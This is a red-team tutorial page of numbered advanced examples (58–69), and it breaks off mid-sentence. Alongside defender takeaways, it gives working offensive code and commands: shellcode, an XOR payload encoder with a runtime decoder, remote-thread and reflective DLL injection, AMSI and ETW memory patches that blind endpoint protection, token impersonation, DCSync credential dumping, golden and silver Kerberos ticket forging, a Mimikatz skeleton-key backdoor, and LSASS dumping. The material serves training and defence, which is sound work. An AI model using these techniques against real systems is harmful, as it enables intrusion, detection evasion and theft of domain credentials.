---
title: "Advanced"
weight: 10000003
date: 2026-05-21T00:00:00+07:00
draft: false
description: "Red team advanced examples — adversary simulation, evasion techniques, and full-chain attack scenarios (Examples 58–85)"
tags: ["red-team", "advanced", "by-example"]
---

> **Ethical Use:** All examples are for authorized penetration testing, CTF competitions,
> lab environments, and defensive understanding only. Never apply these techniques against
> systems without explicit written authorization.

## Example 58: Custom Shellcode Generation

**What this covers:** Position-independent shellcode (PIC) is self-contained machine code
that executes regardless of where it is loaded in memory. Writing it by hand in C and
reviewing the resulting disassembly builds intuition for how exploits work at the byte
level. This foundation underpins every memory-corruption offensive technique.

**Scenario:** Authorized lab environment — compiling shellcode for a custom exploit
development exercise against a local VM running a vulnerable service.

```c
// shellcode_stub.c — position-independent execve("/bin/sh") for x86-64 Linux
// Compile with: gcc -o shellcode_stub shellcode_stub.c -nostdlib -static -fPIC

#include <sys/syscall.h>   // => provides SYS_execve = 59

void _start(void) {
    // => syscall: execve("/bin/sh", ["/bin/sh", NULL], NULL)
    // => rax = 59 (SYS_execve), rdi = ptr to "/bin/sh\0"
    char *shell  = "/bin/sh";          // => 8-byte string on stack
    char *args[] = { shell, 0 };       // => argv: {"/bin/sh", NULL}
    // => rsi = pointer to args array
    // => rdx = 0 (no envp)
    __asm__ volatile (
        "mov $59, %%rax\n"             // => load execve syscall number
        "lea %0, %%rdi\n"             // => first arg: path to binary
        "lea %1, %%rsi\n"             // => second arg: argv array
        "xor %%rdx, %%rdx\n"         // => third arg: NULL envp
        "syscall\n"                    // => kernel transitions to ring 0
        :
        : "m"(shell), "m"(args)
        : "rax", "rdi", "rsi", "rdx"
    );
}
```

```bash
# Extract raw bytes and inspect disassembly
objdump -d shellcode_stub | grep -A 30 '<_start>'
# => 0000000000401000 <_start>:
# =>   401000: 48 c7 c0 3b 00 00 00   mov $0x3b,%rax   ; SYS_execve
# =>   401007: 48 8d 3c 25 ...        lea ...,%rdi      ; path
# =>   40100f: 48 8d 34 25 ...        lea ...,%rsi      ; argv
# =>   401017: 48 31 d2               xor %rdx,%rdx    ; envp=NULL
# =>   40101a: 0f 05                  syscall

# Check for null bytes — they terminate strcpy-based injection
xxd shellcode_stub | grep -c ' 00 '
# => 6 — null bytes present, need encoding for string-based exploits
```

**Key Takeaway:** Writing shellcode by hand reveals exactly which bytes will land in memory
during exploitation. Defenders use this knowledge to build signatures and monitor for
shellcode-like byte patterns in memory with tools like Windows Defender's AMSI and EDR
heap scanning.

**Why It Matters:** Commodity exploit frameworks generate shellcode automatically, but
understanding the assembly-level construction lets a red teamer customize payloads to avoid
specific byte restrictions (null bytes, newlines, non-printable characters) imposed by
vulnerable parsing code. Blue teams that understand shellcode structure can write better
Yara rules and memory-scanning heuristics that catch custom payloads that bypass
off-the-shelf signature databases.

---

## Example 59: AV Evasion — XOR Obfuscation of a Shellcode Payload

**What this covers:** Static antivirus engines match byte signatures against known malware
databases. XOR encoding transforms every byte in a payload so the raw signature no longer
matches, then decodes it at runtime before execution. This is the simplest form of
single-layer shellcode obfuscation.

**Scenario:** Authorized red team engagement — testing endpoint detection capability on a
Windows 10 lab host before deploying a real payload.

```python
#!/usr/bin/env python3
# xor_encode.py — XOR-encode shellcode and emit a self-decoding C stub

import os
import sys

KEY = 0xAB  # => single-byte XOR key; change per engagement to defeat static sigs

# Minimal msfvenom calc.exe pop shellcode (x64, no bad chars) for lab use
# => In a real engagement, replace with your generated payload bytes
RAW_SHELLCODE = bytes([
    0xfc, 0x48, 0x83, 0xe4, 0xf0,   # => prologue: align stack to 16 bytes
    0xe8, 0xc0, 0x00, 0x00, 0x00,   # => call to setup delta
    0x41, 0x51, 0x41, 0x50, 0x52,   # => push registers (ABI callee-save)
    # ... (truncated for illustration; real payload is ~280 bytes)
])

encoded = bytes([b ^ KEY for b in RAW_SHELLCODE])
# => each byte XOR'd with 0xAB; original bytes unrecoverable without key

# Emit C stub that decodes at runtime
print(f"// XOR key: 0x{KEY:02x}")
print(f"// Original length: {len(RAW_SHELLCODE)} bytes")
print(f"unsigned char enc[] = {{")
hex_bytes = ", ".join(f"0x{b:02x}" for b in encoded)
# => e.g., 0x57, 0xe3, 0x28, 0x4f, 0x5b, ...  (no original signature present)
print(f"    {hex_bytes}")
print(f"}};")
print(f"""
// Runtime decoder — walks enc[] and XORs each byte back
for (int i = 0; i < sizeof(enc); i++) {{
    enc[i] ^= 0x{KEY:02x};           // => restore original byte in-place
}}
// => enc[] now contains original shellcode; cast to function pointer and call
void (*exec)() = (void (*)()) enc;
exec();                               // => transfer execution to decoded payload
""")
```

```bash
python3 xor_encode.py > payload_stub.c
# => payload_stub.c contains XOR-encoded array + inline decoder

gcc -o payload_stub.exe payload_stub.c -lkernel32
# => compile to Windows PE (cross-compile with mingw on Linux)

# Run AV scan against original vs encoded
clamscan RAW_SHELLCODE.bin
# => RAW_SHELLCODE.bin: Win.Trojan.Generic FOUND  (static sig match)

clamscan payload_stub.exe
# => payload_stub.exe: OK  (XOR breaks signature; decoder not yet known)
```

**Key Takeaway:** XOR encoding defeats static signature matching but is trivially detected
by behavioral engines that watch for decode loops followed by memory-execute transitions.
Defenders should pair static AV with dynamic sandboxes and EDR behavioral telemetry.

**Why It Matters:** Understanding single-byte XOR obfuscation is the gateway to studying
polymorphic and metamorphic malware. Modern endpoint protection stacks multiple detection
layers precisely because no single layer catches everything. Red teamers iterate through
progressively stronger obfuscation (multi-byte keys, RC4, AES-encrypted loaders) to test
each layer of an organization's detection stack, giving blue teams concrete evidence of
which layers need tuning.

---

## Example 60: Process Injection — CreateRemoteThread

**What this covers:** Process injection places attacker-controlled code into a legitimate
running process so that execution appears to originate from a trusted binary like
`explorer.exe` or `svchost.exe`. `CreateRemoteThread` is the classic Windows API path for
injecting a shellcode payload into a remote process handle.

**Scenario:** Authorized red team engagement — post-exploitation on a Windows 10 lab host
where an implant is already running as the current user.

```c
// inject_remote.c — CreateRemoteThread injection pseudocode (lab only)
// Target: pid supplied as argv[1]; shellcode loaded from file

#include <windows.h>   // => HANDLE, VirtualAllocEx, WriteProcessMemory, etc.
#include <stdio.h>

int main(int argc, char *argv[]) {
    DWORD pid = atoi(argv[1]);          // => parse target PID from command line

    // Step 1: Open handle to target process with required access rights
    HANDLE hProc = OpenProcess(
        PROCESS_ALL_ACCESS,             // => broad rights for alloc + write + exec
        FALSE,                          // => do not inherit handle
        pid                             // => target process identifier
    );
    // => hProc is NULL if process not found or access denied (check GetLastError())

    // Step 2: Allocate RWX memory inside the remote process
    LPVOID pRemote = VirtualAllocEx(
        hProc,                          // => target process handle
        NULL,                           // => let OS choose base address
        sizeof(shellcode),              // => size of our payload
        MEM_COMMIT | MEM_RESERVE,       // => commit and reserve pages
        PAGE_EXECUTE_READWRITE          // => RWX — write then execute in-place
    );
    // => pRemote is the address in the *remote* process's VA space

    // Step 3: Write shellcode bytes into the remote allocation
    SIZE_T written = 0;
    WriteProcessMemory(
        hProc,                          // => remote process
        pRemote,                        // => destination address
        shellcode,                      // => source: our payload buffer
        sizeof(shellcode),              // => byte count
        &written                        // => actual bytes written (verify == sizeof)
    );
    // => shellcode now lives in remote process memory at pRemote

    // Step 4: Create a thread in the remote process starting at our shellcode
    HANDLE hThread = CreateRemoteThread(
        hProc,                          // => target process
        NULL,                           // => default security attributes
        0,                              // => default stack size
        (LPTHREAD_START_ROUTINE)pRemote,// => entry point = our shellcode address
        NULL,                           // => no thread parameter
        0,                              // => run immediately (not suspended)
        NULL                            // => do not capture thread ID
    );
    // => OS schedules the new thread; shellcode executes inside target process
    // => from EDR perspective, malicious code runs under legitimate process name

    WaitForSingleObject(hThread, INFINITE); // => block until injected thread exits
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

**Key Takeaway:** `CreateRemoteThread` is one of the oldest and most-detected injection
primitives — modern EDRs hook it at the kernel level via `NtCreateThreadEx`. Red teamers
use this technique mainly to establish a baseline detection benchmark before testing
stealthier alternatives like `QueueUserAPC` or `NtMapViewOfSection`.

**Why It Matters:** Process injection is the mechanism behind most modern malware's ability
to blend into legitimate processes and bypass allowlisting tools. Blue teams that monitor
for `OpenProcess` + `VirtualAllocEx` + `WriteProcessMemory` call sequences in rapid
succession (within the same thread context) can detect the majority of injection attempts
without needing a specific payload signature, making behavioral detection far more durable
than signature-based approaches.

---

## Example 61: Reflective DLL Injection

**What this covers:** Reflective DLL injection loads a DLL from memory rather than from
disk, bypassing the Windows loader entirely. The DLL contains its own bootstrap loader
that resolves imports and relocates itself without touching the filesystem, defeating
file-based detection and application allowlisting.

**Scenario:** Authorized red team engagement — testing whether the target's EDR detects
in-memory DLL loading on a Windows Server 2022 lab host.

```powershell
# ReflectiveDLLInjection via PowerShell (lab) — uses PowerSploit's Invoke-ReflectivePEInjection
# Reference: https://github.com/PowerShellMafia/PowerSploit (archived, educational)

# Step 1: Load the PowerSploit module into current session (lab only)
Import-Module .\PowerSploit\CodeExecution\Invoke-ReflectivePEInjection.ps1
# => adds Invoke-ReflectivePEInjection to current session's function table

# Step 2: Read the target DLL bytes from disk into a byte array
[Byte[]]$dllBytes = [System.IO.File]::ReadAllBytes(".\Beacon.dll")
# => $dllBytes: raw PE bytes; Beacon.dll is a Cobalt Strike beacon (lab only)
# => from this point, the DLL never needs to be on disk at the target host

# Step 3: Find the PID of explorer.exe as injection target
$targetPid = (Get-Process explorer).Id
# => $targetPid: e.g., 4872 — will host our injected DLL's execution context

# Step 4: Inject DLL bytes into explorer.exe without touching disk
Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $targetPid
# => reflective loader inside DLL resolves its own IAT (Import Address Table)
# => applies relocations using the DLL's relocation table entries
# => calls DllMain with DLL_PROCESS_ATTACH — beacon starts checking in to C2
# => no DLL appears in PEB's loaded module list (stealth from EnumProcessModules)

# Verify injection (from attacker-side C2)
# => C2 console shows new beacon session from target host's explorer.exe
# => whoami on beacon: CORP\jsmith (inherits explorer's token)
```

**Key Takeaway:** Reflective DLL injection defeats file-based indicators of compromise
because the payload never touches disk in an identifiable form. EDRs counter this with
memory scanning, looking for PE magic bytes (`MZ`/`PE`) in non-module heap regions and
monitoring for manual import resolution patterns in `ntdll.dll`.

**Why It Matters:** Fileless techniques represent a major shift in the attacker-defender
dynamic: traditional IOC databases become largely irrelevant when malware lives only in
memory. Defenders must invest in volatile memory forensics capabilities (tools like
Volatility) and EDR solutions that perform continuous memory scanning rather than relying
solely on on-access file scanning, making the security architecture more resilient to
advanced threat actors.

---

## Example 62: AMSI Bypass — PowerShell Memory Patch

**What this covers:** The Antimalware Scan Interface (AMSI) is a Windows API that allows
security products to scan script content (PowerShell, VBScript, JScript) before execution.
Patching `amsi.dll`'s `AmsiScanBuffer` function in memory redirects all scan calls to
return a clean result, neutralizing in-process script scanning.

**Scenario:** Authorized red team engagement — testing AMSI detection coverage on a
Windows 11 host with Defender enabled, in an isolated lab network.

```powershell
# AMSI memory patch — forces AmsiScanBuffer to always return AMSI_RESULT_CLEAN
# Requires current process token with sufficient rights (standard user is enough for own process)

# Step 1: Resolve the base address of amsi.dll in current PowerShell process
$amsiDll = [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')
# => warm-up: ensure CLR is loaded before reflection calls

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    // => returns VA of exported function inside loaded module

    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    // => returns handle (base address) of module already loaded in this process

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
    // => changes memory page protection so we can write to read-only .text section
}
"@

$amsiBase   = [WinApi]::GetModuleHandle("amsi.dll")
# => $amsiBase: e.g., 0x7ffb12340000 — base of amsi.dll in this process

$scanBufAddr = [WinApi]::GetProcAddress($amsiBase, "AmsiScanBuffer")
# => $scanBufAddr: exact VA of AmsiScanBuffer (first function AMSI calls to scan content)

# Step 2: Change page protection to allow writing to the function prologue
$oldProt = 0
[WinApi]::VirtualProtect($scanBufAddr, [UIntPtr]2, 0x40, [ref]$oldProt) | Out-Null
# => 0x40 = PAGE_EXECUTE_READWRITE; saves old protection in $oldProt

# Step 3: Overwrite first 2 bytes with "xor eax, eax; ret" (always returns 0 = CLEAN)
$patch = [Byte[]](0x31, 0xC0, 0xC3)
# => 0x31 0xC0 = xor eax, eax  (AMSI_RESULT_CLEAN = 0)
# => 0xC3      = ret            (return immediately before any real scan logic runs)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBufAddr, 3)
# => patch is now in place; AmsiScanBuffer will return 0 for every call

# Step 4: Restore original page protection (reduce forensic footprint)
[WinApi]::VirtualProtect($scanBufAddr, [UIntPtr]2, $oldProt, [ref]$oldProt) | Out-Null
# => page is executable/readable again but no longer writable — looks normal

Write-Host "AMSI patched — scanning disabled for this PowerShell session"
# => from this point: Invoke-Expression of known-malicious scripts will not trigger Defender
```

**Key Takeaway:** AMSI patching is a process-local bypass; it does not affect other
processes or the kernel. Modern Defender versions implement early-launch AMSI scanning and
ETW-based monitoring that can detect the `VirtualProtect` + `Marshal.Copy` call sequence
before the patch takes effect.

**Why It Matters:** AMSI is a critical choke point for script-based attacks. When red
teamers demonstrate a working AMSI bypass, it signals that the defensive tooling needs a
complementary layer — typically ETW-based process telemetry, PowerShell Script Block
Logging (event 4104), and Constrained Language Mode — since AMSI alone cannot be trusted
once a sufficiently privileged attacker is already executing code in the process.

---

## Example 63: ETW Patching — Disabling Event Tracing for Windows

**What this covers:** Event Tracing for Windows (ETW) is the OS-level telemetry subsystem
that feeds security products, Sysmon, and Microsoft Defender for Endpoint with process,
network, and memory events. Patching `EtwEventWrite` in memory causes all ETW events from
the current process to be silently dropped, blinding kernel-side telemetry.

**Scenario:** Authorized red team engagement — testing whether post-exploitation ETW
disabling goes undetected in a lab running Microsoft Defender for Endpoint.

```powershell
# ETW patch — NOP out EtwEventWrite so this process emits no ETW events
# Works in 64-bit PowerShell; requires write access to ntdll's .text section (user-space)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Ntdll {
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string m);
    // => get base address of already-loaded ntdll.dll
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string f);
    // => resolve address of EtwEventWrite inside ntdll
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a,
        UIntPtr s, uint p, out uint o);
    // => change page protection on the target function's memory page
}
"@

$ntdll    = [Ntdll]::GetModuleHandle("ntdll.dll")
# => ntdll.dll is always loaded; $ntdll = base VA e.g. 0x7ffb10000000

$etwWrite = [Ntdll]::GetProcAddress($ntdll, "EtwEventWrite")
# => $etwWrite: precise VA of EtwEventWrite — all ETW writes pass through here

$old = 0
[Ntdll]::VirtualProtect($etwWrite, [UIntPtr]4, 0x40, [ref]$old) | Out-Null
# => mark page as PAGE_EXECUTE_READWRITE so we can overwrite the function body

# Patch with: xor eax, eax; ret (returns STATUS_SUCCESS without doing anything)
$nop = [Byte[]](0x48, 0x33, 0xC0, 0xC3)
# => 0x48 0x33 0xC0 = xor rax, rax  (return value = 0 = STATUS_SUCCESS)
# => 0xC3           = ret            (return before any event is written to ETW buffer)
[Runtime.InteropServices.Marshal]::Copy($nop, 0, $etwWrite, 4)
# => EtwEventWrite is now a no-op stub; all callers think events were written successfully

[Ntdll]::VirtualProtect($etwWrite, [UIntPtr]4, $old, [ref]$old) | Out-Null
# => restore original page permissions to minimise detection surface

Write-Host "ETW patched — process is now telemetry-dark"
# => Defender for Endpoint loses process-level event stream from this PID
```

**Key Takeaway:** ETW patching is a process-local operation that blinds per-process
telemetry but does not affect kernel ETW providers (e.g., `Microsoft-Windows-Kernel-Process`)
or Sysmon's kernel driver, which operate outside the user-mode patch's reach.

**Why It Matters:** As endpoint security increasingly relies on ETW for behavioral
detection, attackers have strong incentive to disable it early in the kill chain. This
asymmetry has pushed defenders toward kernel-level telemetry (PPL-protected processes,
kernel ETW providers, virtualization-based security) that cannot be neutralized by
user-mode patches, reflecting an ongoing escalation cycle in the attacker-defender arms
race within modern Windows security architecture.

---

## Example 64: Token Impersonation — Privilege Escalation via Token Stealing

**What this covers:** Windows access tokens represent a process's security identity.
A process running as a local administrator can open a handle to another process's token
(e.g., `SYSTEM`-level `winlogon.exe`), duplicate it, and impersonate it to gain elevated
privileges without exploiting a kernel vulnerability.

**Scenario:** Authorized red team engagement — post-exploitation on a Windows Server 2022
lab host where the current shell runs as a local administrator.

```powershell
# Token impersonation via Incognito (Metasploit module) — lab demonstration
# Assumes meterpreter session with local admin rights on target

# In meterpreter session:
load incognito
# => Incognito module loaded; provides list_tokens and impersonate_token

list_tokens -u
# => Delegation Tokens Available
# =>   NT AUTHORITY\SYSTEM         (from winlogon.exe, lsass.exe)
# =>   CORP\Administrator          (from RDP session)
# =>   CORP\svc_backup             (from scheduled task)
# => Impersonation Tokens Available
# =>   NT AUTHORITY\NETWORK SERVICE

impersonate_token "NT AUTHORITY\\SYSTEM"
# => [+] Delegation token available
# => [+] Successfully impersonated user NT AUTHORITY\SYSTEM

getuid
# => Server username: NT AUTHORITY\SYSTEM
# => shell now executes under SYSTEM token; full local privilege

# Alternatively, manual PowerShell token steal (no Metasploit):
# 1. Find a SYSTEM process PID
$sysPid = (Get-Process winlogon)[0].Id   # => e.g., 648

# 2. Open with TOKEN_DUPLICATE rights (requires SeDebugPrivilege / local admin)
# 3. DuplicateTokenEx with SecurityImpersonation level
# 4. SetThreadToken or ImpersonateLoggedOnUser on current thread
# => net effect: current thread runs with SYSTEM token
```

**Key Takeaway:** Token impersonation requires only local administrator access, not a
kernel exploit — making it a low-risk, high-reward escalation step. Defenders should
monitor for `SeDebugPrivilege` use and unexpected cross-process token operations logged
via Windows event 4674 (privilege use) and Sysmon event 10 (process access).

**Why It Matters:** Many organizations treat local administrator accounts as equivalent to
non-privileged users because they are not domain admins. Token impersonation demolishes
this assumption: a local admin on any machine that hosts a SYSTEM-level process can
trivially obtain SYSTEM rights without any exploit. This underlines the importance of
tiered administration models, credential guard, and restricting which processes run as
SYSTEM on sensitive servers.

---

## Example 65: DCSync Attack — Replicating Active Directory Credentials

**What this covers:** DCSync abuses the MS-DRSR (Directory Replication Service Remote
Protocol) to request password hashes from a Domain Controller as if the attacker's machine
were another DC performing normal replication. The attack requires `DS-Replication-Get-Changes-All`
privileges, which Domain Admins possess by default.

**Scenario:** Authorized red team engagement — post-exploitation in a lab Active Directory
domain after obtaining Domain Admin credentials.

```bash
# secretsdump.py DCSync — replicates all domain credentials without touching LSASS memory

python3 secretsdump.py CORP/Administrator:'P@ssw0rd'@192.0.2.10 -just-dc
# => [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# => CORP.EXAMPLE/Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9dc5a...
# => CORP.EXAMPLE/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3b4de47e5e4f7...
# =>   krbtgt hash is the golden ticket key — CRITICAL asset
# => CORP.EXAMPLE/svc_sql:1108:aad3b435b51404eeaad3b435b51404ee:9af4b3c2d1e0...
# => CORP.EXAMPLE/jsmith:1109:aad3b435b51404eeaad3b435b51404ee:8c3e71fb2a9d...
# => [*] Kerberos keys grabbed
# => CORP.EXAMPLE/Administrator:aes256-cts-hmac-sha1-96:7e8a3b...
# => CORP.EXAMPLE/krbtgt:aes256-cts-hmac-sha1-96:f1e2d3...

# DCSync generates specific Windows Security event 4662 on the DC:
# => Object: CN=domain,DC=CORP,DC=LOCAL
# => Operation: Object Access
# => Properties: {1131f6aa-...} DS-Replication-Get-Changes-All  <-- detection pivot
```

**Key Takeaway:** DCSync harvests every credential in the domain — including the
`krbtgt` account hash needed for golden tickets — without ever touching LSASS memory on
the DC, defeating many memory-protection controls. Defenders should alert on event 4662
with the `DS-Replication-Get-Changes-All` property accessed by non-DC machine accounts.

**Why It Matters:** A single DCSync operation can exfiltrate the keys to the entire
kingdom: every user's NT hash, Kerberos keys, and the krbtgt secret. The attack's
protocol-level legitimacy (it uses real MS-DRSR) makes it invisible to network-layer
detection without dedicated Active Directory monitoring. Organizations must implement
tiered access controls so that `DS-Replication-Get-Changes-All` rights are held only by
actual Domain Controllers, and alert immediately when any other entity requests those
replication properties.

---

## Example 66: Golden Ticket Attack — Forging a Kerberos TGT

**What this covers:** A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT)
signed with the `krbtgt` account's secret key. Because every KDC trusts TGTs signed by
`krbtgt`, a forged ticket grants the attacker any identity, any group membership, and any
privilege for the lifetime of the krbtgt key — up to 10 years by default.

**Scenario:** Authorized red team engagement — demonstrating persistence in a lab AD
domain after a DCSync operation yielded the krbtgt hash.

```bash
# Golden ticket via Mimikatz — executed on a domain-joined Windows lab host

mimikatz # kerberos::purge
# => Ticket(s) purge for current session is OK
# => clear existing tickets so forged ticket is used cleanly

mimikatz # kerberos::golden /user:FakeAdmin /domain:CORP.EXAMPLE \
  /sid:S-1-5-21-1234567890-987654321-111111111 \
  /krbtgt:3b4de47e5e4f7a8b2c3d4e5f6a7b8c9d \
  /id:500 /groups:512,519,544,555,513 /endin:87600 /renewmax:262800
# => /user:FakeAdmin   — synthetic username (does NOT need to exist in AD)
# => /sid              — domain SID obtained from DCSync or whoami /user
# => /krbtgt           — krbtgt NT hash from DCSync (Example 65)
# => /id:500           — RID 500 = built-in Administrator
# => /groups:512,519   — Domain Admins (512), Enterprise Admins (519), etc.
# => /endin:87600      — ticket valid for 10 years in minutes
# => Golden ticket file saved to ticket.kirbi

mimikatz # kerberos::ptt ticket.kirbi
# => Pass The Ticket: ticket.kirbi
# => * File: 'ticket.kirbi': OK
# => forged TGT is now injected into current logon session's ticket cache

klist
# => #0> Client: FakeAdmin @ CORP.EXAMPLE
# =>     Server: krbtgt/CORP.EXAMPLE @ CORP.EXAMPLE
# =>     End Time: 5/21/2036  — 10-year validity

dir \\DC01\C$
# => Volume in drive \\DC01\C$ has no label.
# => Directory of \\DC01\C$  — full DC filesystem access as Domain Admin
```

**Key Takeaway:** Golden tickets survive password resets of any account except `krbtgt`
itself. Defenders must rotate the `krbtgt` password **twice** (to invalidate both the
current and previous secret) and then monitor for tickets with anomalous validity periods
or non-existent user SIDs using Kerberos event 4768/4769 correlation.

**Why It Matters:** A golden ticket represents total and persistent domain compromise. Even
if a defender discovers and removes the attacker's foothold, existing forged tickets
remain valid until krbtgt is rotated twice. This attack demonstrates why achieving Domain
Admin is considered an endpoint of an engagement — at that tier, the attacker has
durable, protocol-level control that conventional remediation steps cannot address without
a coordinated domain-wide recovery effort.

---

## Example 67: Silver Ticket Attack — Forging a Service Ticket

**What this covers:** A Silver Ticket is a forged Kerberos Service Ticket (ST) signed
with a specific service account's NT hash. Unlike a golden ticket, it bypasses the KDC
entirely — the forged ST is presented directly to the target service, which validates it
locally using the service account's secret. This makes silver tickets harder to detect
because no KDC traffic is generated.

**Scenario:** Authorized red team engagement — lateral movement to a SQL Server in a lab
domain after compromising the `svc_sql` service account hash.

```bash
# Silver ticket via Mimikatz — targeting MSSQL service on SQLSRV01

# Obtain service account hash first (from secretsdump or LSASS dump)
# svc_sql NT hash: 9af4b3c2d1e0f5a6b7c8d9e0f1a2b3c4

mimikatz # kerberos::golden /user:Administrator /domain:CORP.EXAMPLE \
  /sid:S-1-5-21-1234567890-987654321-111111111 \
  /target:SQLSRV01.CORP.EXAMPLE \
  /service:MSSQLSvc \
  /rc4:9af4b3c2d1e0f5a6b7c8d9e0f1a2b3c4 \
  /id:500 /groups:512,519,544 \
  /ticket:silver_mssql.kirbi
# => /target:SQLSRV01  — the specific host running the service
# => /service:MSSQLSvc — SPN prefix; ticket valid for MSSQLSvc/SQLSRV01.CORP.EXAMPLE
# => /rc4              — svc_sql NT hash (service account secret, NOT krbtgt)
# => generates silver_mssql.kirbi — forged ST, signed by service account's key

mimikatz # kerberos::ptt silver_mssql.kirbi
# => * File: 'silver_mssql.kirbi': OK
# => ST injected into session — SQLSRV01 will accept it without contacting DC

# Connect to SQL with the injected silver ticket
sqlcmd -S SQLSRV01.CORP.EXAMPLE -Q "SELECT SYSTEM_USER"
# => SYSTEM_USER
# => Administrator        — SQL Server sees a valid ticket for domain Administrator
# => --------------------------------
# => (1 rows affected)
# => full SA-equivalent access depending on SQL configuration
```

**Key Takeaway:** Silver tickets require only one service account's hash (not the domain
`krbtgt` secret) and generate zero KDC traffic, making them nearly invisible to
Kerberos-focused detection tools. Defenders should monitor for service tickets presented
without a corresponding TGS-REQ event at the DC, using honeypot service principals to
catch forged tickets.

**Why It Matters:** Silver tickets demonstrate that compromising a single service account
hash — obtainable from LSASS, DCSync, or Kerberoasting — can grant stealthy, persistent
access to specific high-value services without any further interaction with the DC. This
elevates the importance of protecting service account credentials and enforcing
Managed Service Accounts (MSAs) or Group Managed Service Accounts (gMSAs), which
automatically rotate their passwords every 30 days and cannot be Kerberoasted.

---

## Example 68: Skeleton Key Attack — Domain Controller Backdoor

**What this covers:** The skeleton key attack injects a master password into the LSASS
process on a Domain Controller, allowing the attacker to authenticate as any domain user
using a fixed secret (`mimikatz` by default) in addition to their real password. The
legitimate passwords continue to work, making the backdoor non-disruptive and hard to
detect through normal authentication monitoring.

**Scenario:** Authorized red team engagement — demonstrating maximum-impact persistence on
a lab Windows Server 2022 DC after achieving Domain Admin access.

```bash
# Skeleton key via Mimikatz — executed with Domain Admin rights on the DC directly

mimikatz # privilege::debug
# => Privilege '20' OK  — SeDebugPrivilege granted, required to patch LSASS

mimikatz # misc::skeleton
# => [KDC] data
# => [KDC] struct
# => [KDC] keys patch OK
# => [RC4] NTLM    —  the skeleton key NT hash is now installed in LSASS
# => Skeleton Key installed — the password is now 'mimikatz' for ALL domain accounts

# Test: authenticate as any user using the skeleton key password
net use \\DC01\C$ /user:CORP\jsmith mimikatz
# => The command completed successfully.
# => jsmith's real password still works too; skeleton key is additive, not replacing

net use \\DC01\C$ /user:CORP\CEO_Account mimikatz
# => The command completed successfully.
# => works for ANY account including Executive accounts — demonstrates full domain access

# Skeleton key is IN-MEMORY ONLY:
# => DC reboot removes it — attacker must re-inject after each restart
# => does NOT persist across reboots without additional mechanisms (e.g., scheduled task)

# Detection: Event 4611 (new logon process) or Sysmon event 10 (LSASS memory access)
# => Mimikatz patch is visible to memory-scanning EDRs as anomalous LSASS modification
```

**Key Takeaway:** The skeleton key backdoor is impactful but fragile — a DC reboot wipes
it, and it is highly visible to EDRs that protect LSASS via PPL (Protected Process Light)
or Credential Guard. Defenders should enable `RunAsPPL` for LSASS and monitor for event
4611 on DCs.

**Why It Matters:** The skeleton key attack illustrates the gravity of Domain Controller
compromise: an attacker with DC code execution can subvert the entire authentication
fabric of the domain. This motivates the zero-trust principle that even domain
administrators should operate under least-privilege constraints with just-in-time
elevation, tiered administration, and Privileged Access Workstations (PAWs) — reducing
the blast radius if a DC-level credential is stolen.

---

## Example 69: LSASS Dump — Extracting Credentials from Memory

**What this covers:** The Local Security Authority Subsystem Service (LSASS) caches
plaintext passwords, NT hashes, and Kerberos tickets for logged-on users. Dumping LSASS
memory extracts these credentials for offline cracking or pass-the-hash. Three common
methods — Task Manager, `procdump`, and `comsvcs.dll` — each have different detection
profiles.

**Scenario:** Authorized red team engagement — credential harvesting on a Windows 10 lab
host after obtaining local administrator access.

```powershell
# Method 1: Task Manager (interactive, high noise)
# Right-click lsass.exe in Task Manager → Create dump file
# => saves to C:\Users\<user>\AppData\Local\Temp\lsass.DMP
# => Requires admin; generates Security event 10 (Sysmon) immediately

# Method 2: Sysinternals procdump (signed Microsoft binary — "living off the land")
$lsassPid = (Get-Process lsass).Id    # => e.g., 720
.\procdump.exe -accepteula -ma $lsassPid lsass.dmp
# => [10:42:01] Dump 1 initiated: .\lsass.dmp
# => [10:42:02] Dump 1 writing: Estimated dump file size is 65 MB.
# => [10:42:03] Dump 1 complete: 65 MB written in 1.2 seconds
# => -ma = full minidump (all memory regions); -accepteula = suppress EULA popup
# => signed binary reduces AV alerts; Defender may still flag lsass dump target

# Method 3: comsvcs.dll MiniDump — no third-party binary needed (LOLBin)
$pid = (Get-Process lsass).Id          # => 720
$dumpPath = "C:\Windows\Temp\out.dmp"
# => comsvcs.dll is a Windows-signed DLL with an exported MiniDump function
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $pid $dumpPath full
# => dumps lsass to out.dmp using only built-in Windows components
# => "full" = all memory; detection profile: rundll32 spawning with lsass PID argument

# Offline extraction with Mimikatz (attacker machine, copy dump first)
mimikatz # sekurlsa::minidump lsass.dmp
# => Switch to MINIDUMP

mimikatz # sekurlsa::logonpasswords
# => Authentication Id : 0 ; 123456 (00000000:0001e240)
# => Session           : Interactive from 2
# => User Name         : jsmith
# => Domain            : CORP
# => Logon Server      : DC01
# =>  * Username : jsmith
# =>  * Domain   : CORP.EXAMPLE
# =>  * NTLM     : 8c3e71fb2a9d4b5c6d7e8f9a0b1c2d3e  ← usable for PtH
# =>  * SHA1     : 4f5e6a7b8c9d0e1f2a3b4c5d6e7f8a9b
```

**Key Takeaway:** Each LSASS dump method has a distinct detection signature: Task Manager
generates a UI event, procdump is flagged by file reputation, and comsvcs.dll is caught
by Sysmon rule 10 filtering for `lsass.exe` as the accessed process. Microsoft Credential
Guard prevents plaintext password caching even when a dump succeeds.

**Why It Matters:** LSASS dumping is one of the most impactful single actions in a
Windows-based engagement: a single dump can yield credentials for every user session
active on that host, often including domain administrator accounts. Enabling Credential
Guard, running LSASS as a PPL process, and deploying EDR rules that alert on any process
